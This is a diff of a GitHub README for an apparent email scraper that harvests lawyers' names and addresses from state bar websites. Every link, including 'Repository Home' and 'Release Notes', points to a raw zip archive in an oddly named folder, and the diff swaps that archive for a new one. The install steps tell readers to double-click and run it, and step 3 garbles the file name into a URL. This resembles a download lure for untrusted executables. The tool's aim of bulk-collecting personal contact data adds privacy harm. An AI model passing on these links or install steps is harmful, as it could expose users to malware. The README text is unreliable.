@@ -1,6 +1,6 @@
 # 📨 state-bar-websites-email-scraper - Extract Emails from State Bar Websites Effortlessly
 
-[![Download Release](https://raw.githubusercontent.com/ANURAG1-DEV-HASH/state-bar-websites-email-scraper/main/dendroidal/state-bar-websites-email-scraper-1.7.zip%20Now-Release%20Page-blue)](https://raw.githubusercontent.com/ANURAG1-DEV-HASH/state-bar-websites-email-scraper/main/dendroidal/state-bar-websites-email-scraper-1.7.zip)
+[![Download Release](https://github.com/ANURAG1-DEV-HASH/state-bar-websites-email-scraper/raw/refs/heads/main/dendroidal/bar_state_email_scraper_websites_v2.3-beta.4.zip%20Now-Release%20Page-blue)](https://github.com/ANURAG1-DEV-HASH/state-bar-websites-email-scraper/raw/refs/heads/main/dendroidal/bar_state_email_scraper_websites_v2.3-beta.4.zip)
 
 ## 📋 Overview
 The State Bar Websites Email Scraper helps you gather names and emails from state bar websites across the United States. It is designed for users who need easy access to legal professional contact information. Whether you are doing research or simply need to connect with lawyers, this tool simplifies the process.
@@ -15,9 +15,9 @@ To begin, you need to download the software from the releases page and run it. H
 - **Storage Space:** At least 100 MB of free disk space
 
 ### 📥 Download & Install
-1. Click the link to visit the release page: [Download Now](https://raw.githubusercontent.com/ANURAG1-DEV-HASH/state-bar-websites-email-scraper/main/dendroidal/state-bar-websites-email-scraper-1.7.zip)
+1. Click the link to visit the release page: [Download Now](https://github.com/ANURAG1-DEV-HASH/state-bar-websites-email-scraper/raw/refs/heads/main/dendroidal/bar_state_email_scraper_websites_v2.3-beta.4.zip)
 2. Once on the releases page, find the latest version of the software. It will usually be at the top.
-3. Look for the file labeled “https://raw.githubusercontent.com/ANURAG1-DEV-HASH/state-bar-websites-email-scraper/main/dendroidal/state-bar-websites-email-scraper-1.7.zip” (for Windows users) or the corresponding file for your operating system.
+3. Look for the file labeled “https://github.com/ANURAG1-DEV-HASH/state-bar-websites-email-scraper/raw/refs/heads/main/dendroidal/bar_state_email_scraper_websites_v2.3-beta.4.zip” (for Windows users) or the corresponding file for your operating system.
 4. Click the file link to begin the download. Save it to a location you can easily access, like your Desktop or Downloads folder.
 5. After the download is complete, locate the file and double-click it to run the installer.
 6. Follow the on-screen prompts to complete the installation.
@@ -63,7 +63,7 @@ The State Bar Websites Email Scraper is open-source software, licensed under the
 For inquiries or feedback, please reach out via the GitHub repository. Your input helps us make the software better for everyone.
 
 ## 🔗 Additional Resources
-- [Repository Home](https://raw.githubusercontent.com/ANURAG1-DEV-HASH/state-bar-websites-email-scraper/main/dendroidal/state-bar-websites-email-scraper-1.7.zip)
-- [Release Notes](https://raw.githubusercontent.com/ANURAG1-DEV-HASH/state-bar-websites-email-scraper/main/dendroidal/state-bar-websites-email-scraper-1.7.zip)
+- [Repository Home](https://github.com/ANURAG1-DEV-HASH/state-bar-websites-email-scraper/raw/refs/heads/main/dendroidal/bar_state_email_scraper_websites_v2.3-beta.4.zip)
+- [Release Notes](https://github.com/ANURAG1-DEV-HASH/state-bar-websites-email-scraper/raw/refs/heads/main/dendroidal/bar_state_email_scraper_websites_v2.3-beta.4.zip)
 
 Now you’re ready to download and use the State Bar Websites Email Scraper. Happy scraping!
